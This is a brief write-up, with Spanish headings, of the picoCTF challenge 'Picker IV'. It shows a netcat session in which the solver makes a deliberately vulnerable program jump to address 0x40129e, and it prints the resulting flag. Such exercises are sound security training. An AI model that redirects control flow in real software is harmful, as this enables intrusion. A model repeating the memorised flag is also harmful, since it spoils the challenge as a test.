# Objetivo

Can you figure out how this program works to get the flag? Connect to the program with netcat: `$ nc saturn.picoctf.net 51816` The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/527/picker-IV.c). The binary can be downloaded [here](https://artifacts.picoctf.net/c/527/picker-IV).

# Solucion

```Shell
┌──(kali㉿kali)-[~/Downloads]
└─$ nc saturn.picoctf.net 51816
Enter the address in hex to jump to, excluding '0x': 0x40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
```

# Notas adicionales

# Referencias